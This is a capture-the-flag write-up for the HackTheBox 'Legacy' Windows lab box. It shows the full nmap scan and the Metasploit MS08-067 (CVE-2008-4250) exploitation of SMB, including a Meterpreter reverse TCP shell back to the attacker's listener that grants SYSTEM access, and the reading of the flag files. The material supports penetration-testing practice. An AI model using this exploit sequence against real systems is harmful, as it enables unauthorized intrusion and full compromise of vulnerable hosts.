# Legacy

Welcome to Legacy, the first Windows box on HackTheBox Labs. We'll get started with the IP address, `10.10.10.4`.

We'll employ the `nmap` scanning tool:

```
$ sudo nmap 10.10.10.4
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 19:46 CEST
Nmap scan report for 10.10.10.4
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

We can see that there are 3 ports open. These ports all relate to the SMB (Server Message Block) protocol. Searching around we can find a CVE for SMB with remote code execution from 2008: `CVE-2008-4250`. Let's exploit it:

```
msf6 > search SMB 2008

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .

   ...


Interact with a module by name or index. For example info 82, use 82 or use exploit/windows/smb/ms08_067_netapi
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 2003 SP2 Turkish (NX)'

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                       ml
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.8     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.14.11

msf6 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.11:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.4:1032) at 2025-07-18 19:52:28 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We are administrator immediately! Let's read the flags:

```
meterpreter > cat Documents\ and\ Settings\\Administrator\\Desktop\\root.txt
993442d258b0e0ec917cae9e695d****

meterpreter > cat Documents\ and\ Settings\\john\\Desktop\\user.txt
e69af0e4f443de7e36876fda4ec7****
```

And that's a wrap!
